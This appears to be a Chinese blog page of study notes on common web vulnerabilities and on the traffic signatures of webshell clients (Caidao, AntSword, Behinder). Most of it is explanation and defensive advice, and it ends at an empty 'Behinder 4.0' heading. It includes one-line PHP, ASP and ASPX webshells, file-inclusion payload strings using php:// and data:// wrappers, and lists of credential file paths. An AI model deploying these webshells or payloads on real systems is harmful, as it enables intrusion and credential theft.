<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>跨站脚本攻击:就是拼接了恶意的HTML代码,盗取cookie等</p>
<p>反射型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击者利用用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。</span><br><span class="line"></span><br><span class="line">b、通过 HTML 转义，可以防止部分 XSS 攻击。（不同情况下，需要采用不同的转义规则）</span><br><span class="line"></span><br><span class="line">c、如果数据是以 json 的形式，内联到 html 中 ， 插入 json 的地方不能用 escapeHTML() 转义， 这样会破坏json格式。</span><br><span class="line"></span><br><span class="line">d、如果 json 中包含字符串 时, 会闭合前一个</span><br><span class="line"></span><br><span class="line">e、对于链接跳转，如&lt;a href=&quot;xxx&quot;或location.href=“xxx”，要检验其内容，禁止以javascript:开头的链接，和其他非法的 scheme。</span><br></pre></td></tr></table></figure>

<p>存储型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.攻击者将恶意代码提交到目标网站的数据库中。</span><br><span class="line"></span><br><span class="line">b.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</span><br><span class="line"></span><br><span class="line">c.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</span><br><span class="line"></span><br><span class="line">d.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</span><br></pre></td></tr></table></figure>

<p>DOM型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在取值写入页面或动态执行的业务场景下,在将各种来源获取到的参数值传入JavaScript“三姐妹”函数（innerHTML、document.write、eval）处理前，对传入数据中的HTML特殊字符进行转义处理能防止大部分DOM-XSS的产生.</span><br><span class="line">根据不同业务的真实情况，还应使用正则表达式，针对传入的数据做更严格的过滤限制，才能保证万无一失。</span><br><span class="line">不到万不得已，不要使用eval函数处理不可控的外部数据。</span><br><span class="line">对于从cookie，还是从localStorage、Referer、Window name、SessionStorage中获取数据，都应使用安全的函数，对传入的数据做过滤后，再传递给相关函数写入页面或执行。</span><br><span class="line">参考/使用filter.js库</span><br></pre></td></tr></table></figure>

<p><strong>DOM 型 XSS 跟前两种 XSS 的区别</strong>：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
<p>漏洞防护:HTML实体化编码,正则表达式过滤,返回包进行 content-type配置，配置为json格式： application&#x2F;json </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">输入验证和过滤：对于所有用户输入的数据，包括表单提交、URL参数等，进行严格的验证和过滤。确保只允许合法和预期的输入通过。可以使用白名单过滤、正则表达式匹配等方法来防止不安全的输入。</span><br><span class="line"></span><br><span class="line">输出转义：在将用户输入数据插入到HTML页面时，使用适当的输出转义机制，将特殊字符转换为它们的HTML实体形式。这样可以防止浏览器将输入内容解释为代码。</span><br><span class="line"></span><br><span class="line">使用安全的编码库：使用安全的编码库来处理用户输入和输出，这些库会自动执行必要的输入验证、过滤和输出转义，从而减少开发者的出错机会。</span><br><span class="line"></span><br><span class="line">Content Security Policy（CSP）：CSP是一种安全策略，可以在HTTP头中设置，用于限制页面可以加载的资源和执行的脚本。通过设置合适的CSP规则，可以有效减少XSS攻击的风险。</span><br><span class="line"></span><br><span class="line">HttpOnly和Secure标记：在设置Cookie时，使用HttpOnly标记确保Cookie不能被JavaScript访问，使用Secure标记确保Cookie只在HTTPS连接中传输。</span><br><span class="line"></span><br><span class="line">使用框架和库：使用流行的Web开发框架和库（如React、Angular、Vue.js等），这些框架通常有内置的安全机制，可以减少XSS攻击的风险。</span><br><span class="line"></span><br><span class="line">教育用户：提高用户的网络安全意识，让他们了解XSS攻击的风险和如何避免受到攻击。</span><br><span class="line"></span><br><span class="line">定期安全审计：定期检查和审计代码，查找潜在的XSS漏洞，及时修复。</span><br><span class="line"></span><br><span class="line">最小化权限：在数据库和服务器上使用最小权限原则，限制应用程序和用户的访问权限，减少攻击者能够获取的敏感信息。</span><br><span class="line"></span><br><span class="line">避免内联脚本：尽量避免使用内联脚本，而是使用外部JavaScript文件。这样可以帮助隔离用户输入和执行的代码。</span><br><span class="line"></span><br><span class="line">使用HTTPOnly Cookie：使用HTTPOnly Cookie可以防止通过JavaScript访问Cookie，从而减少攻击者窃取会话令牌的可能性。</span><br></pre></td></tr></table></figure>



<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>跨站请求伪造:没有token验证,用户自愿发起的请求</p>
<p>CSRF原理:是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
<p>当点击或访问时,自动触发构造的pyload,多用于修改资料,密码等</p>
<p>绕过方式</p>
<p><img src="/photo/image-20240529231810113.png" alt="image-20240529231810113"></p>
<p><img src="/photo/image-20240529231818031.png" alt="image-20240529231818031"></p>
<p>漏洞防护:筛选出需要防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验 Referer,添加验证码机制</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>服务器请求伪造:ssrf可以通过某站点来访问另一个站点,达到跳板的作用</p>
<p> SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p>
<p>1.可以通过服务器，通过服务器获取内网主机、端口和banner信息。</p>
<p>2.对内网的应用程序进行攻击，比如Redis、jboss等。</p>
<p>3.利用file协议读取文件。</p>
<p>4.可以攻击内网程序造成溢出</p>
<p>协议:</p>
<p>dict:探测内网端口信息</p>
<p>file:任意文件访问</p>
<p>gopher:攻击内网redis并反弹shell,利用redis未授权访问攻击redis</p>
<p>http&#x2F;https:探测主机存活</p>
<p>造成ssrf漏洞的函数</p>
<p>file_get_contents，fsockopen()，curl_exec():</p>
<p><img src="/photo/image-20240529233120867.png" alt="image-20240529233120867"></p>
<p>漏洞防护:</p>
<p>1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等<br>2.黑名单加入内网 IP。<br>3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS.</p>
<p><img src="/photo/image-20240529233654623.png" alt="image-20240529233654623"></p>
<p><img src="/photo/image-20240529233709968.png" alt="image-20240529233709968"></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE:"></a>XXE:</h1><p><img src="/photo/image-20240609170304635.png" alt="image-20240609170304635"></p>
<p>没有禁止外部实体的加载，导致可加载恶意外部文件,对xml文件进行过滤,通过file协议读取文件信息,转发到预定设置的公网ip<br>	原理：DTD部分去读取敏感的信息、将读取到的信息赋值到实体当中、XML部分使用的过程中，将实体内容输出<br>	simplexml_load_string<br>	libxml_disable_entity_loader函数禁止</p>
<p>危害：</p>
<p>XXE可以通过多种方式被利用，具体取决于应用程序的XML解析器的设置方式以及响应在客户端的呈现方式。该漏洞利用的一些载体包括应用程序的输出、后端评估和外部交互。</p>
<p>本地文件披露–场景1</p>
<p>当应用程序评估易受攻击的请求并在客户端打印数据时，本地文件泄露是可能的。使用正确配置的攻击向量，配置不当的解析器现在将查看服务器的系统文件并以攻击者请求的内容进行响应。</p>
<p>本地文件披露–场景2</p>
<p>如果请求的文件不包含文本数据或者是损坏的xml文件，那么我们需要采取不同的方法。我们将需要使用子DTD来提取这些文件类型。 这里使用参数实体而不是一般实体。</p>
<p>本地文件披露–场景3</p>
<p>当应用程序评估用户输入并能够查找外部文件但不会在屏幕上打印任何输出数据时，我们将需要通过称为带外XXE的方法提取数据。</p>
<p>拒绝服务</p>
<p>创建拒绝服务的方法之一是使用“外部实体扩展”，可以在其中引用外部xml文件。如果XML解析器配置不正确，这将向攻击者IP发出 HTTP请求。</p>
<p>攻击者IP上的目标文件可以以递归引用其他外部实体的方式编写。在XML解析器处理此文件之前，它必须检索所有已定义的实体。这可能导致所有可用资源的耗尽并有效地造成拒绝服务。<br>防护措施：</p>
<p>1.升级XML解析器：及时升级XML解析器到最新版本，以修复已知的漏洞和缺陷。同时，关注安全漏洞通报和修复信息，及时采取相应的防护措施。</p>
<p>2.限制外部实体引用：在XML解析器的配置中，限制或禁用外部实体引用的功能。这可以防止攻击者利用外部实体引用执行恶意操作。</p>
<p>3.输入验证和过滤：对XML文档的输入进行严格的验证和过滤，确保其中不包含恶意代码或敏感信息。使用白名单机制来限制允许的输入内容，防止潜在的攻击。</p>
<p>4.访问控制和权限管理：严格控制对XML解析器的访问权限，确保只有经过授权的用户和应用程序能够执行相关操作。同时，对敏感数据和关键操作进行权限管理，防止未经授权的访问和操作。</p>
<p>一般通过改包让目标去读取本地文件(如config.php)然后请求恶意xml，然后通过恶意xml去请求记录数据的跳板，最后通过跳板携带数据到记录点，完成一个获取数据的操作。</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含:"></a>文件包含:</h1><p>可将被包含的任意文件当做脚本来执行</p>
<p>本地包含LFI</p>
<p>访问敏感信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">常见的敏感信息路径</span><br><span class="line">(1):查看系统版本:C:\boot.ini</span><br><span class="line">(2):查看IIS配置文件:C:\windows\system32\inetsrv\MetaBase.xml</span><br><span class="line">(3):查看存储Windows系统初次安装的密码:C:\windows\repair\sam</span><br><span class="line">(4):查看MySQL配置:C:\ProgramFiles\Mysql\my.ini</span><br><span class="line">(5):查看MySQLroot密码:C:\ProgramFiles\mysql\data\mysql\user.MYD</span><br><span class="line">(6):查看php配置信息:C:\windows\php.ini</span><br><span class="line">1.查看boot.ini文件:C:\boot.ini(没有包含php代码，原样打印)</span><br><span class="line"></span><br><span class="line">Linux</span><br><span class="line">常见的敏感信息路径</span><br><span class="line">(1):查看账户信息:/etc/passwd</span><br><span class="line">(2):查看密码文件:/etc/shadow</span><br><span class="line">(3):查看Apache2配置文件:/usr/local/app/apache2/conf/http.conf</span><br><span class="line">(4):查看虚拟网站配置:/usr/local/app/conf/extra/http-vhost.conf</span><br><span class="line">(5):查看php相关配置:/usr/local/app/php5/lib/php.ini</span><br><span class="line">(6):查看Apache配置文件:/etc/httpd/conf/httpd.conf</span><br><span class="line">(7):查看MySQL配置文件:/etc/my.conf</span><br></pre></td></tr></table></figure>

<p>远程包含RFI	allow_url_include &#x3D; On</p>
<ul>
<li>include:找不到文件产生警告，脚本继续运行。</li>
<li>include_once：相对于include，文件被包含后不会再次被包含。</li>
<li>require：找不到文件，产生致命错误，脚本停止。</li>
<li>require_once：相对于require，文件被包含后不会再次被包含。</li>
</ul>
<p>php伪协议:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">//             	 访问本地文件</span></span><br><span class="line">http:<span class="comment">//					访问http或https网址</span></span><br><span class="line">ftp:<span class="comment">//					访问FTP或FTPs的url</span></span><br><span class="line">php:<span class="comment">//					访问各个输入/输出流</span></span><br><span class="line">zlib:<span class="comment">//					压缩流</span></span><br><span class="line">data:<span class="comment">//					数据</span></span><br><span class="line">glob:<span class="comment">//					查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">//					php归档</span></span><br><span class="line">ssh2:<span class="comment">//					secure shell 2</span></span><br><span class="line">rar:<span class="comment">//					rar</span></span><br><span class="line">ogg:<span class="comment">//					音频流</span></span><br><span class="line">expect:<span class="comment">//				处理交互式的流</span></span><br></pre></td></tr></table></figure>

<p>php伪协议的利用条件和方法</p>
<table>
<thead>
<tr>
<th align="center">协议</th>
<th align="center">allow_url_fopen</th>
<th align="center">allow_urli_include</th>
<th align="center">用法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file:&#x2F;&#x2F;</td>
<td align="center">off&#x2F;on</td>
<td align="center">off&#x2F;on</td>
<td align="center">?file&#x3D;file:&#x2F;&#x2F;C:&#x2F;windows&#x2F;win.ini</td>
</tr>
<tr>
<td align="center">php:&#x2F;&#x2F;filter</td>
<td align="center">off&#x2F;on</td>
<td align="center">off&#x2F;on</td>
<td align="center">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;index.php</td>
</tr>
<tr>
<td align="center">php:&#x2F;&#x2F;input</td>
<td align="center">off&#x2F;on</td>
<td align="center">on</td>
<td align="center">?file&#x3D;php:&#x2F;&#x2F;input  POST传参:<?php phpinfo(); ?></td>
</tr>
<tr>
<td align="center">zip:&#x2F;&#x2F;</td>
<td align="center">off&#x2F;on</td>
<td align="center">off&#x2F;on</td>
<td align="center">?file&#x3D;zip:&#x2F;&#x2F;C:&#x2F;windows&#x2F;file.zip%23phpcode.txt</td>
</tr>
<tr>
<td align="center">compress bzip2:&#x2F;&#x2F;</td>
<td align="center">off&#x2F;on</td>
<td align="center">off&#x2F;on</td>
<td align="center">?file&#x3D;compress bzip2:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file bz2 [or] ?file&#x3D;compress bzip:&#x2F;&#x2F;file bz2</td>
</tr>
<tr>
<td align="center">compress zlib:&#x2F;&#x2F;</td>
<td align="center">off&#x2F;on</td>
<td align="center">off&#x2F;on</td>
<td align="center">?file&#x3D;compress zlib:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file gz [or]      ?file&#x3D;compress zlib:&#x2F;&#x2F;..&#x2F;file gz</td>
</tr>
<tr>
<td align="center">data:&#x2F;&#x2F;</td>
<td align="center">on</td>
<td align="center">on</td>
<td align="center">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?>  [or] ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,base64,base64加密的字符串   [or] ?file&#x3D;data:text&#x2F;plain,<?php phpinfo();?>  [or] ?file&#x3D;data:text&#x2F;plain,base64,base64加密后的字符串</td>
</tr>
</tbody></table>
<h2 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><blockquote>
<p>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
</blockquote>
<p><strong>注：当enctype&#x3D;”multipart&#x2F;form-data”时，php:&#x2F;&#x2F;input是无效的。</strong></p>
<h2 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a><strong>file:&#x2F;&#x2F;</strong></h2><blockquote>
<p>用于访问本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. file://[文件的绝对路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br><span class="line">2. [文件的相对路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure>

<h2 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><blockquote>
<p>php:&#x2F;&#x2F; 用于访问各个输入&#x2F;输出流（I&#x2F;O streams），经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input，php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码。</p>
</blockquote>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>php:&#x2F;&#x2F;input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;output</td>
<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;fd</td>
<td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>
<td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;filter</td>
<td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody></table>
<h2 id="http-、https"><a href="#http-、https" class="headerlink" title="http:&#x2F;&#x2F;、https:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;、https:&#x2F;&#x2F;</h2><blockquote>
<p>URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[http：//网络路径和文件名]</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p>
<h2 id="实战中遇到的案例"><a href="#实战中遇到的案例" class="headerlink" title="实战中遇到的案例:"></a>实战中遇到的案例:</h2><p>一次面试中遇到的问题:</p>
<p>?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖:"></a>变量覆盖:</h1><p>变量覆盖指的是可以用我们的传参值替换程序原有的变量值<br>$$</p>
<p>extrcat()</p>
<p>import_request_variables</p>
<ul>
<li>当第二个参数为空或者 EXTR_OVERWRITE 时，变量注册如果遇到冲突会直接覆盖掉原变量。</li>
<li>当第二个变量为 EXTR_IF_EXISTS 时，仅当原变量已存在是对其进行更新，否则不注册新变量。</li>
</ul>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传:"></a>文件上传:</h1><ol>
<li>判断前后端验证:可以用Burp抓包改包和F12来进行判断</li>
<li>判断验证机制:FUZZ出允许上传什么后缀(黑名单机制),白名单机制要继续往下判断</li>
<li>测试容器和中间件:查看看容器和中间件的版本,测试是否具有解析漏洞等</li>
<li>判断WAF:测试waf过滤规则,看是检测的哪部分,例如:文件头,文件内容,文件后缀</li>
<li>查看返回:看返回内容,是否会重定向改名,压缩,上传路径和回显路径不一样,二次渲染马被删掉等情况</li>
</ol>
<h2 id="文件上传Bypass"><a href="#文件上传Bypass" class="headerlink" title="文件上传Bypass"></a>文件上传Bypass</h2><p>00截断,%00,.htaccess文件解析,后缀大小写,文件后缀加空格,点,::$DATA（Windows文件流绕过),构造文件后缀,双写后缀名,条件竞争,CGI解析漏洞</p>
<p>脏数据增大文件体积绕过</p>
<p>filename做手脚,删除前面的参数或将单双引号更改</p>
<p>php一句话木马 ： <?php @eval($_POST[‘pass ']);?></p>
<p>asp一句话木马 ：&lt;%eval request (“pass “)%&gt;</p>
<p>aspx一句话木马：&lt;%@ Page Language&#x3D;”Jscript”%&gt; &lt;%eval(Request.Item[“pass “], “ unsafe “);%&gt;</p>
<p>黑名单:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JPS脚本语言:	.jsp	.jspx	.jspf</span><br><span class="line">PHP脚本语言:	.php	.php3	.php4	.phtml</span><br><span class="line">ASP脚本语言:	.asp	.asa	.cer	.aspx	</span><br><span class="line">			   .exe	   .exee</span><br></pre></td></tr></table></figure>

<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数:"></a>代码执行函数:</h2><p>eval、assert、call_user_func、create_function、array_map、execute</p>
<p><img src="/photo/image-20240530150054730.png" alt="image-20240530150054730"></p>
<p><img src="/photo/image-20240530150114279.png" alt="image-20240530150114279"></p>
<p><img src="/photo/image-20240530150821487.png" alt="image-20240530150821487"></p>
<p><img src="/photo/image-20240530150833014.png" alt="image-20240530150833014"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263566/article/details/128833833">https://blog.csdn.net/weixin_43263566/article/details/128833833</a></p>
<p>解析网址</p>
<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数:"></a>命令执行函数:</h2><p>system、passthru、exec、pcntl_exec、shell_exec、popen()、&#96;&#96;</p>
<p><img src="/photo/image-20240530145841095.png" alt="image-20240530145841095"></p>
<p>二者区别，代码执行本质上是调用后端语言（PHP，JAVA……）来执行特定代码，而命令执行本质是调用系统的命令执行的接口，与对于的不同的语言无关，只与系统的版本有关。</p>
<p>命令执行利用方式</p>
<p><img src="/photo/image-20240530151054776.png" alt="image-20240530151054776"></p>
<p><img src="/photo/image-20240530152701856.png" alt="image-20240530152701856"></p>
<h1 id="特征"><a href="#特征" class="headerlink" title="特征:"></a>特征:</h1><h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><h3 id="菜刀的特征（Eval）"><a href="#菜刀的特征（Eval）" class="headerlink" title="菜刀的特征（Eval）"></a>菜刀的特征（Eval）</h3><p>PHP:  <?php @eval($_POST['caidao']);?></p>
<p>PHP特征</p>
<p>每个请求中的前缀都是一样的，一定要主要这个前缀**：解码方式，URL解码+base64 解码+PHP代码格式化 得到**</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J  以QG开头，7J结尾的固定代码。</span><br><span class="line"></span><br><span class="line">解码后是：解码方式，URL解码+base64 解码+PHP代码格式化 得到</span><br><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&#x27;5.3.0&#x27;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);</span><br></pre></td></tr></table></figure>

<h5 id="返回的数据报中有X-Y的字样，结果夹在中间"><a href="#返回的数据报中有X-Y的字样，结果夹在中间" class="headerlink" title="返回的数据报中有X@Y的字样，结果夹在中间"></a>返回的数据报中有X@Y的字样，结果夹在中间</h5><p><img src="/photo/image-20240530153002915.png" alt="image-20240530153002915"></p>
<p>JSP流量特征：</p>
<p><img src="/photo/image-20240530153155020.png" alt="image-20240530153155020"></p>
<p>ASP:  &lt;%eval request(“caidao”)%&gt;</p>
<p><img src="/photo/image-20240530153247615.png" alt="image-20240530153247615"></p>
<p> ASP.NET:  &lt;%@ Page Language&#x3D;”Jscript”%&gt;</p>
<p>&lt;%eval(Request.Item[“caidao”],”unsafe”);%&gt;</p>
<p>base64加密，php马有eval，(base64_decode ($_POST[z0]))，&amp;z0&#x3D;QGluaV9zZXQ</p>
<h3 id="蚁剑的特征"><a href="#蚁剑的特征" class="headerlink" title="蚁剑的特征"></a>蚁剑的特征</h3><p>Php中使用assert，eval执行, </p>
<p><img src="/photo/image-20240530154415165.png" alt="image-20240530154415165"></p>
<p>特征一；有iniset（）相关关键字，其中流量最中明显的特征为@ini_set(“display_errors”,”0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现</p>
<p>特征二：</p>
<p>ua头有antsword关键字</p>
<p>asp 使用eval ，execute函数被打断混淆了</p>
<p><img src="/photo/image-20240530153614828.png" alt="image-20240530153614828"></p>
<p>在jsp使用的是Java类加载（ClassLoader）,同时会带有base64编码解码等字符特征</p>
<p>以_0x 开头的参数名，@ini_set(“display_errors”,”0”)</p>
<h3 id="冰蝎的特征"><a href="#冰蝎的特征" class="headerlink" title="冰蝎的特征"></a>冰蝎的特征</h3><p>1、大量的 content-type：application，content-type 为 application&#x2F;octet-stream。</p>
<p>2、默认内置 16 个 ua，content-length 请求长度payload 都为定长。</p>
<p>3、Accept头有application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange属于弱特征。</p>
<p>4、accpect-language字段特征：Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</p>
<p>Php中使用assert，eval执行, asp 使用eval ，在jsp使用的是Java类加载（ClassLoader）,同时会带有base64编码解码等字符特征</p>
<p><strong>2.0版本</strong>，采用预共享密钥，密钥格式为md5(“admin”)[0:16], 所以在各种语言的webshell中都会存在16位数的连接密码，默认变量为k，使用<code>AES加密 + base64编码</code>，AES使用动态密钥对通信进行加密，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。 </p>
<p>使用 aes 加密发起三次请求</p>
<p>第一次请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的</p>
<p>第二次请求是为了获取 key，第三次使用 key 的 aes 加密进行通信</p>
<p><strong>3.0版本</strong>，每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache</p>
<p>使用AES加密 + base64编码,取消了2.0的动态获取密钥，使用固定的连接密钥，AES加密的密钥为webshell连接密码的MD5的前16位，默认连接密码是”rebeyond”(即密钥是md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)。进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。</p>
<p>3.0连接jsp的webshell的请求数据包中的content-type字段常见为application&#x2F;octet-stream。</p>
<p>content-type为application&#x2F;octet-stream**<br><strong>请求包中content-length 为5740或5720（可能会根据Java版本而改变)</strong><br><strong>每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache</strong></p>
<p>强特征：</p>
<ol>
<li>content-type</li>
<li>Accept&amp;Cache-Control</li>
</ol>
<p>弱特征：</p>
<ol>
<li>内置16个ua头</li>
<li>content-length 请求长度</li>
</ol>
<p>工作原理：</p>
<ol>
<li>老版冰蝎工具在连接Webshell的时候会存在一个密钥协商的过程，这个过程是纯明文的数据交换，冰蝎存在这样的特征：发起一共两次的密钥协商，通过比较两次密钥协商的返回包中内容的不同部分来获取其中的密钥。<br>在这个协商过程中，防护设备可以结合URL、请求包和返回包的内容以及头部信息来综合进行判断，这种类型检测的优势是这部分的流程是冰蝎内置的实现，攻击者不太好进行修改绕过。而劣势是在大流量的环境下很容易引起大量的误报。</li>
<li>加密传输，使用随机数MD5的高16位作为密钥储存会话的$_SESSION变量中，返回攻击者。</li>
</ol>
<p>冰蝎4.0：</p>
